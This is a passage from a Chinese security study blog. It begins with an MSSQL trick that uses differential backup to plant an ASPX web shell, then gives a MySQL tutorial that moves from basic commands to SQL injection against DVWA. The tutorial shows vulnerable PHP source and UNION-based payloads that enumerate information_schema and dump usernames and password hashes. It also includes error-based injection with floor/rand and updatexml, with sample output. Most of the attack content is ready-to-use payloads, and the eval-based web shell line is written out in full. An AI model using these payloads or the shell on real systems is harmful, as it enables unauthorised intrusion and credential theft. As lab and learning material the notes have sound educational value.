<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vLXFpbmctL3AvMTA5MTA0NjguaHRtbA==">https://www.cnblogs.com/-qing-/p/10910468.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<p>在<code>sql server</code> 里<code>dbo</code>和<code>sa</code>权限都有备份数据库权限，我们可以把数据库备份成<code>aspx</code>文件，这样我们就可以通过<code>mssqlserver</code>的备份数据库功能生成一个网页小马。</p>
<p>异备份有几率会导致网站挂掉！如果上面的<code>LOG备份</code>拿shell成功的话就尽量别用差异备份拿shell这种方法！具体为啥我也不知道。。。</p>
<ul>
<li>备份数据库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup database test to disk &#x3D; &#39;c:\bak.bak&#39;;--</span><br></pre></td></tr></table></figure>

<ul>
<li>创建一张表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table [dbo].[test] ([cmd] [image]);--</span><br></pre></td></tr></table></figure>

<ul>
<li>写入文件到表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;;insert into test(cmd) values(&#39;&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cc&quot;],&quot;unsafe&quot;);%&gt;&#39;)--</span><br></pre></td></tr></table></figure>

<ul>
<li>创建脚本文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup database test to disk&#x3D;&#39;c:\inetpub\wwwroot\cc.aspx&#39; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>MSSQL</tag>
        <tag>总结</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL小结</title>
    <url>/posts/c118d50/</url>
    <content><![CDATA[<p>Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行,导致参数中的特殊字符打破了SQL语句原有逻辑,黑客可以利用该漏洞执行任意SQL语句。</p>
<a id="more"></a>

<h1 id="MySQL安装及配置"><a href="#MySQL安装及配置" class="headerlink" title="MySQL安装及配置"></a>MySQL安装及配置</h1><h2 id="Mysql安装（这里版本为8-0-17）"><a href="#Mysql安装（这里版本为8-0-17）" class="headerlink" title="Mysql安装（这里版本为8.0.17）"></a>Mysql安装（这里版本为8.0.17）</h2><ul>
<li>第一步：下载Mysql</li>
</ul>
<blockquote>
<p>地址：<span class="exturl" data-url="aHR0cHM6Ly9kZXYubXlzcWwuY29tL2Rvd25sb2Fkcy9teXNxbC8=">https://dev.mysql.com/downloads/mysql/<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<ul>
<li>第二步：配置Mysql环境变量</li>
</ul>
<blockquote>
<p>将下载的mysql文件夹<code>bin</code>目录加入环境变量，<code>D:\mysql\bin</code></p>
</blockquote>
<ul>
<li>第三步：安装mysql</li>
</ul>
<blockquote>
<p>首先执行<code>mysqld --initialize-insecure</code>(自动生成无密码Root用户)，然后以管理员的权限执行CMD：<code>mysqld install</code>，即可完成安装。</p>
</blockquote>
<ul>
<li>第四步：启动/停止mysql</li>
</ul>
<blockquote>
<p><code>net start mysql</code></p>
<p><code>net stop mysql</code></p>
</blockquote>
<h2 id="登陆MySQL及配置密码"><a href="#登陆MySQL及配置密码" class="headerlink" title="登陆MySQL及配置密码"></a>登陆MySQL及配置密码</h2><ul>
<li>登陆MySQL(这里创建的是无密码root)</li>
</ul>
<blockquote>
<p><code>mysql -u root -p</code>，提示输入密码时候无需输入，回车即可。</p>
</blockquote>
<ul>
<li>更改Mysql密码</li>
</ul>
<blockquote>
<p><code>ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;RootPwd@123456&#39;;</code></p>
<p><code>flush privileges;</code></p>
</blockquote>
<ul>
<li>开启mysql远程</li>
</ul>
<p>查看是否支持远程： <code>select host ,user from user;</code></p>
<blockquote>
<p>第一种：<code>update user set host =&#39;%&#39; where user=&#39;root&#39;;</code></p>
<p>第二种：<code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option; </code></p>
</blockquote>
<h2 id="MySQL命令学习"><a href="#MySQL命令学习" class="headerlink" title="MySQL命令学习"></a>MySQL命令学习</h2><ul>
<li>有关查看数据库相关信息的命令：</li>
</ul>
<blockquote>
<p><code>select @@version</code>查看当前MySQL版本</p>
<p><code>select user(); / select system_user();/select session_user();</code>查看当前用户</p>
<p><code>select database();</code>查看当前数据库</p>
<p><code>select connection_id();</code>返回当前客户的连接ID</p>
<p><code>select now()</code>查看系统当前时间</p>
<p><code>select @@basedir；</code>查看Mysql的安装路径</p>
<p><code>select @@datadir;</code>查看数据库安装路径</p>
<p><code>show databases;</code>查看当前MySQL所有库名</p>
<p><code>mysqldump -u root -p --default-character-set=UTF8 [database] [table] &gt; dump.txt</code>Mysql导出位.txt</p>
<p><code>mysql -u root -p --default-character-set=UTF8 database_name &lt; dump.txt</code>导入</p>
</blockquote>
<ul>
<li>一些命令</li>
</ul>
<blockquote>
<p><code>use &lt;database_name&gt;</code>使用某个数据库，需指定库名</p>
<p><code>show tables;</code>查看当前数据库的数据库表</p>
<p><code>select * from users;</code> 查询users表中所有的数据</p>
<p><code>select first_name from users;</code>查询users表中first_name字段的所有内容</p>
<p><code>select concat(user,0x3C,password) from users;</code> concat连接字符串函数</p>
<p><code>select group_concat(user,0x3C,password) from users;</code>将user,password字段所有内容连接成一个字符串</p>
</blockquote>
<p>实践：</p>
<blockquote>
<p><code>select * from users limit m,n;</code>查询user表中数据，输出第m(代表下标，下标都是从0开始)条开始的n条数据</p>
<p><code>select concat(user,0x3c,password) from users limit 3,2;</code>将users表中user、password字段第四、五条数据用&lt;号连接，输出</p>
</blockquote>
<ul>
<li>一些高级命令</li>
</ul>
<blockquote>
<p><code>select mid(user(),2,3);</code>mid字符串截取，截取当前用户名第二个字符开始的三个字符</p>
<p><code>select substr(user(),2,3);</code>subsets字符串截取，截取当前用户名第二个字符开始的三个字符</p>
<p><code>select ord(mid(database(),3,1));/select ord(substr(database(),3,1));</code>查询当前库名的第三个字符的ASCII</p>
<p><code>select ascii(&#39;s&#39;);</code>查询s的ASCII值，同ord</p>
<p><code>select char(97);</code>将ASCII值转为字符串</p>
<p><code>select count(*) from users;</code>查询users表中数据条数</p>
<p><code>select length(user());</code>查询当前用户名长度</p>
<p><code>select sleep(2);</code>延时两秒返回数据</p>
<p><code>select * from users order by user;</code>根据字段名排序(拓展：order by 8执行正常，order by 9报错，证明字段个数只有八个)</p>
<p><code>select password from users where user_id=2 or user_id=3;</code>查询users表中user_id为2和3的password字段的值</p>
</blockquote>
<h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><ul>
<li>增加一条数据</li>
</ul>
<p>需要匹配users表中字段个数，如果字段不匹配会报错；如果字段内容限定为<code>not NUll</code>，字段为空时也报错。</p>
<blockquote>
<p><code>insert into users values(&#39;9&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test123&#39;,&#39;ssss&#39;,&#39;lujing&#39;,&#39;2019&#39;,&#39;2020&#39;);</code></p>
</blockquote>
<ul>
<li>修改数据</li>
</ul>
<blockquote>
<p><code>update users set user=&#39;ccc&#39; where password=&#39;ssss&#39;;</code>将password为ssss的那条数据的user字段内容更新为ccc；多条数据用逗号隔开 <code>set user=&#39;ccc&#39;,user_id=&#39;20&#39;</code></p>
</blockquote>
<ul>
<li>删除数据</li>
</ul>
<blockquote>
<p><code>delete from users where user_id=9;</code>删除users表中user_id为9的那条数据</p>
<p><code>drop table users;</code>删除users表</p>
<p><code>drop database dvwa;</code>删除dvwa库</p>
</blockquote>
<h3 id="Mysql数据去重"><a href="#Mysql数据去重" class="headerlink" title="Mysql数据去重"></a>Mysql数据去重</h3><p>(找了半天，只能将查询结果导入到另外一张表中了。。。)</p>
<ul>
<li>利用distinct进结果去重，然后将查询的结果导入到另外一张表中。</li>
</ul>
<p><code> insert ignore into user_info select distinct name,sex,id_card,tel,address,mail from users_room;</code></p>
<h3 id="SQL注入可能用到的语法"><a href="#SQL注入可能用到的语法" class="headerlink" title="SQL注入可能用到的语法"></a>SQL注入可能用到的语法</h3><p>基础：</p>
<ul>
<li>基于and/or判断注入点</li>
</ul>
<p>首先判断页面正常返回。</p>
<p>然后<code>select user,password from users where user_id=2 and 1=1;</code>正确执行(and两边表达式均成立，返回为真)页面正常返回</p>
<p><code>select user,password from users where user_id=2 and 1=2;</code>返回为空(and两边表达式一真一假，返回为假)页面返回错误或者不正常</p>
<p>即可证明SQL存在</p>
<p>OR同理—&gt;</p>
<p><code>select user,password from users where user_id=2 or 1=1;</code>返回所有user和password的内容(or两边表达式都为真且1=1恒成立，则返回所有)</p>
<p><code>select user,password from users where user_id=2 or 1=2;</code>仅返回一条数据(1=2不成立,因此只返回user_id=2的那条数据指定的内容)</p>
<blockquote>
<p>注意：and 1=1 并非绝对，只要是表达式，类似于’s’=’s’等等，，，，</p>
<p>判断SQL注入存在，需要三个页面对比才行。</p>
</blockquote>
<ul>
<li>注入点的多种情况</li>
</ul>
<p><code>select user, password from users where user_id=&#39;2&#39;;</code>如果源于句，使用了引号将ID值扩起来，需要构造如下：<code>where user_id=&#39;2&#39; and &#39;1&#39;=&#39;1</code>,也即是<code>2&#39; and &#39;1&#39;=&#39;1</code>，<code>2&#39; and &#39;1&#39;=&#39;2</code></p>
<p>同理，如果使用双引号，括号扩起来的，也需要按照上面的情况。(如果<code>where user_id=(&#39;1&#39;)</code>这样呢？)</p>
<blockquote>
<p>试一试：<code>2&#39;</code>,<code>2&#39;&#39;</code>?</p>
</blockquote>
<ul>
<li>SQL注入的原理</li>
</ul>
<p>就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<h3 id="高级查询语法"><a href="#高级查询语法" class="headerlink" title="高级查询语法"></a>高级查询语法</h3><ul>
<li>查询结果排序</li>
</ul>
<p><code>select * from users order by last_name;</code>查询users表中的所有数据，并使用last_name字段内容排序(根据的是ASXCII码)</p>
<blockquote>
<p>可以利用<code>select * from users order by N;</code>判断users表字段个数，N小于等于字段数正常返回数据，大于则报错。</p>
<p><code>-- -</code>,<code>#</code>在数据库中表示注释之后的内容,<code>/**/</code>表示多行注释,注释掉扩起来的内容</p>
<p><code>select * from users order by last_name#asdasdas;</code></p>
<p><code>select * from users order by last_name-- -asadasdas;</code></p>
<p>多行注释也可以用于行内：<code>select * from users/**/order/*ssssss*/by last_name;</code></p>
</blockquote>
<p>其他几个排序：</p>
<p>降序排列查询结果：<code>select * from users DESC;</code></p>
<p>升序(默认排序):<code>select * from users ASC;</code></p>
<ul>
<li>组合查询</li>
</ul>
<blockquote>
<p>一个查询中从不同的表返回结果数据</p>
<p>在一个表中执行多个查询，按一个查询返回数据</p>
</blockquote>
<p><code>select user, password from users where user_id=&#39;2&#39; union select last_name, first_name from users where user_id=&#39;4&#39;</code></p>
<p>查询user_id=2的use,password字段内容，查询user_id=4的last_name,first_name字段的值，一起返回(也即是同时返回。。。)</p>
<ul>
<li>模糊查询</li>
</ul>
<p>关键词<code>like</code>，通配符<code>%</code>,<code>*</code>,<code>.</code>等，常用的正则规则字符。</p>
<blockquote>
<p><code>select * from users where avatar like &#39;%hac%&#39;</code>匹配users表中avatar字段中含有hac的内容</p>
</blockquote>
<p>“*“表示匹配零个或多个在它前面的东西。例如，”D*“匹配任何数量的”D”字符</p>
<p>“.“ 匹配任何单个的字符。</p>
<blockquote>
<p>当使用正则匹配时，使用REGEXP和NOT REGEXP操作符（或RLIKE和NOT RLIKE，功能是一样的）</p>
</blockquote>
<ul>
<li>模糊查询中的注入：</li>
</ul>
<p><code>select * from users where avatar like &#39;%hac%&#39; union select password from users;</code>首先查询avatar字段中包含hac的数据，然后查询users表中的password字段内容，然后组合起来返回(会去重)</p>
<ul>
<li>一些事项：</li>
</ul>
<p><code>select user_id from users union select password from users;</code>正常执行(组合查询时候，前后查询的字段数要一样，这样就是错误的：<code>select user_id from users union select password,user from users;</code>)</p>
<h3 id="SQL注入示例"><a href="#SQL注入示例" class="headerlink" title="SQL注入示例"></a>SQL注入示例</h3><p>题目：where user_id=2处存在注入点，要求判断注入点并查询到user,password字段内容。</p>
<p>源于句：<code>select user_id from users where user_id=2;</code></p>
<p>解：</p>
<ol>
<li><code>select user_id from users where user_id=2 and 1=1-- -;</code>正常</li>
<li><code>select user_id from users where user_id=2 and 1=2-- -;</code>不正常，结合起来判断存在注入点</li>
<li><code>select user_id from users where user_id=2 order by 1-- -;</code>正常</li>
<li><code>select user_id from users where user_id=2 order by 2-- -</code>错误，证明只有一个字段(在使用的user_id)</li>
<li><code>select user_id from users where user_id=2 union select 1-- -</code> 1为占位符，填充使用</li>
<li><code>select user_id from users where user_id=2 union select database()-- -</code>替换占位符，可以查询一些常用信息(版本，数据库名，用户名，路径等)</li>
<li><code>select user_id from users where user_id=2 union select concat(user,0x3c,password) from users-- -</code>(使用concat连接user,password一起输出，就不用连续使用union select)</li>
</ol>
<h2 id="Mysql系统表利用"><a href="#Mysql系统表利用" class="headerlink" title="Mysql系统表利用"></a>Mysql系统表利用</h2><h3 id="infomation-schema说明"><a href="#infomation-schema说明" class="headerlink" title="infomation_schema说明"></a>infomation_schema说明</h3><blockquote>
<p>MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p>
</blockquote>
<p><strong>information_schema数据库表说明:</strong></p>
<ul>
<li><p>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</p>
</li>
<li><p>TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</p>
</li>
<li><p>COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</p>
</li>
<li><p>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</p>
</li>
<li><p>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</p>
</li>
<li><p>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</p>
</li>
<li><p>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</p>
</li>
<li><p>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</p>
</li>
<li><p>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</p>
</li>
<li><p>COLLATIONS表：提供了关于各字符集的对照信息。</p>
</li>
<li><p>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</p>
</li>
<li><p>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</p>
</li>
<li><p>KEY_COLUMN_USAGE表：描述了具有约束的键列。</p>
</li>
<li><p>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</p>
</li>
<li><p>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</p>
</li>
<li><p>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表</p>
</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RlbW9uc29uL2FydGljbGUvZGV0YWlscy84MDM4ODY3Nw==">https://blog.csdn.net/demonson/article/details/80388677<i class="fa fa-external-link-alt"></i></span>（MySQL information_schema 详解）</p>
<h3 id="information-schema使用示例"><a href="#information-schema使用示例" class="headerlink" title="information_schema使用示例"></a>information_schema使用示例</h3><ul>
<li>获取表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,table_name from information_schema.tables where table_schema&#x3D;(数据库名十六进制) limit 2,1-- - # 当前数据库所有表，使用limit n,1 逐条输出。</span><br></pre></td></tr></table></figure>

<ul>
<li>判断表的数量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select count(table_name) from information_schema.tables where table_schema &#x3D;database())&#x3D;2-- -  # 判断表的数量为2</span><br></pre></td></tr></table></figure>

<ul>
<li>获取字段名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 1,1-- -</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length((select column_name from information_schema.columns where table_name&#x3D;(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)limit 0,1)&#x3D;10-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>组合语句</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length((select column_name from information_schema.columns where table_name&#x3D;(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)limit 0,1))&#x3D;10-- -</span><br></pre></td></tr></table></figure>

<h1 id="MySQL注入基础"><a href="#MySQL注入基础" class="headerlink" title="MySQL注入基础"></a>MySQL注入基础</h1><h2 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例：select database();查询当前数据库名称</span><br><span class="line">➢ 1.system_user() 系统用户名</span><br><span class="line">➢ 2.user() 用户名</span><br><span class="line">➢ 3.current_user() 当前用户名</span><br><span class="line">➢ 4.session_user() 链接数据库的用户名</span><br><span class="line">➢ 5.database() 数据库库名</span><br><span class="line">➢ 6.version() mysql 数据库版本信息</span><br><span class="line">➢ 7.load_file() 转换成16 或10 进制 读取本地文件</span><br><span class="line">➢ 8.@@datadir 读取数据库路径</span><br><span class="line">➢ 9.@@basedir MYSQL 安装路径</span><br><span class="line">➢ 10.@@version_compile_os</span><br></pre></td></tr></table></figure>

<h2 id="常用关键字-函数"><a href="#常用关键字-函数" class="headerlink" title="常用关键字/函数"></a>常用关键字/函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">limit m,n     # 从m开始检索n条数据</span><br><span class="line">select mid(database(),2,1) # 用于得到当前数据库名的第二个字符</span><br><span class="line">select ord(mid(user(),1,1))&#x3D; 114  # ord函数返回字符串第一个字符的 ASCII 值。</span><br><span class="line">select concat(1,0x3c,2)    # 将字符串1和2用&lt;连接起来   输出为：1&lt;2</span><br><span class="line">select sleep(2)    # 结果在两秒钟后返回，可理解为暂停2秒</span><br><span class="line">select length(user())  # 当前用户名长度  length()  长度函数</span><br><span class="line">select substr(user(),2,1)     # 从第二个字符开始截取一个字符长度,这里为o</span><br><span class="line">IF(expr1,expr2,expr3)     # expr1 是TRUE则IF()的返回值为expr2; 否则返回值则为 expr3</span><br><span class="line">select count(user) from users  # 查询users表中user字段所有数据的 个数</span><br></pre></td></tr></table></figure>

<h2 id="系统表简介"><a href="#系统表简介" class="headerlink" title="系统表简介"></a>系统表简介</h2><blockquote>
<p>Information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p>
<p>该库有多个表其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
</blockquote>
<p>更多介绍：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RvdWF0b3UvYXJ0aWNsZS9kZXRhaWxzLzgwNzc1NjAx">https://blog.csdn.net/Touatou/article/details/80775601<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="显性注入"><a href="#显性注入" class="headerlink" title="显性注入"></a>显性注入</h2><blockquote>
<p>经过在线DVWA <span class="exturl" data-url="aHR0cDovLzQzLjI0Ny45MS4yMjg6ODEv">http://43.247.91.228:81<i class="fa fa-external-link-alt"></i></span>测试(介绍基础，所以选择Low级别)，在线的级别调不好，请本地搭建。</p>
</blockquote>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;Submit&#x27;</span>]))&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="comment">// Retrieve data </span></span><br><span class="line">     </span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>; </span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result); </span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123; </span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">&quot;first_name&quot;</span>); </span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">&quot;last_name&quot;</span>); </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . $id . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . $first . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . $last; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>重点看源码中：<code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;</code></p>
</blockquote>
<p>漏洞产生原因：SQL语句未经过处理，直接将传入的<code>$id</code>当做参数执行。(这里不进行 or 1=1之类的测试)</p>
<p>构造语句进行解释：<code>user_id=&#39;$id&#39;</code>,如果传入的$id值为<code>1&#39; order by 5-- -</code>，源语句变成了：</p>
<blockquote>
<p><code>user_id=&#39;1’ order by 5-- -&#39;</code>，在数据库中是可以正常执行的。</p>
<p>当num为2时， 也就是<code>user_id=&#39;1’ order by 2-- -</code>正常执行，为3时报错，说明当前库的users表有两个字段。</p>
</blockquote>
<h3 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h3><blockquote>
<p>这里数据库版本大于5.0，测试的是字符型，因此是 ‘ and ‘1’=’1’，省略 1’</p>
<p>这里并非直接获取密码啊，什么的，仅仅展示可能用到了的语句。</p>
</blockquote>
<ul>
<li>开始注入之前，获取有用信息：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 2-- - # 获取当前数据库，所使用表的字段长度，-- - 表示注释之后的内容</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,2-- -  # 匹配字段</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;2&#39; union select 1,2-- -  # 爆字段位置，也即是可用字段，这里都可以</span><br><span class="line"># 这时候就可以使用mysql系统函数来测试。</span><br><span class="line"></span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,ord(mid(user(),1,1))&#x3D;114-- -# 正常返回证明当前数据库用户为r开头一般为root.</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,ord(mid(user(),2,1))&#x3D;111-- -# 正常返回证明当前数据库用户第二个字符为o</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>获取数据库表名：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取表名源语句：</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;(数据库名十六进制) limit 2,1-- - # 当前数据库所有表，使用limit n,1 逐条输出。</span><br><span class="line"></span><br><span class="line">注入语句：</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;0x64767761 limit 2,1-- -  </span><br></pre></td></tr></table></figure>

<ul>
<li>获取字段名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理同获取表名。</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 1,1-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>获取字段内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 已经爆出表名和字段名，直接查询即可</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select user,password from users-- -</span><br><span class="line"># 上语句有两个可用注入字段，如果只有一个呢？</span><br><span class="line"></span><br><span class="line"># 第一种方式，挨个爆，先爆名字，再爆密码</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,user from users-- -</span><br><span class="line"></span><br><span class="line"># 第二种方式，使用concat函数将字符串连接起来</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,concat(user,0x3c,password) from users-- - </span><br><span class="line"># &#96;0x3c&#96;为&#96;&lt;&#96;,这里将user、password用&#96;&lt;&#96;连接起来。输出格式为：pablo&lt;0d107d09f5bbe40cade3de5c71e9e9b7</span><br></pre></td></tr></table></figure>

<p>至此，已经爆出数据库中可用的账号密码，非root。类似于XXX系统的用户/管理员账号密码。脱裤子的话请绕行- -</p>
<h3 id="MySQL函数报错"><a href="#MySQL函数报错" class="headerlink" title="MySQL函数报错"></a>MySQL函数报错</h3><h4 id="Floor"><a href="#Floor" class="headerlink" title="Floor"></a>Floor</h4><p>当使用 floor，rand，group by 连用时候会报错。利用报错，使用concat连接，可以实现注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select concat(floor(rand(0)*2), &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#39;),count(1) from users group by user_id;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| concat(floor(rand(0)*2), &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#39;) | count(1) |</span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| 0&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br><span class="line">| 0&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select concat(floor(rand(0)*2), &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#39;,(select user())),count(1) from users group by user_id;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">+--------------------------------------------------+----------+</span><br><span class="line">| concat(floor(rand(0)*2), &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#39;,(select user())) | count(1) |</span><br><span class="line">+--------------------------------------------------+----------+</span><br><span class="line">| 0&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">| 0&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">+--------------------------------------------------+----------+</span><br></pre></td></tr></table></figure>

<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml() &#x2F;&#x2F;5.1.5</span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where user_id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select database())),1));</span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:dvwa&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where user_id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1));</span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:root@localhost&#39;</span><br></pre></td></tr></table></figure>

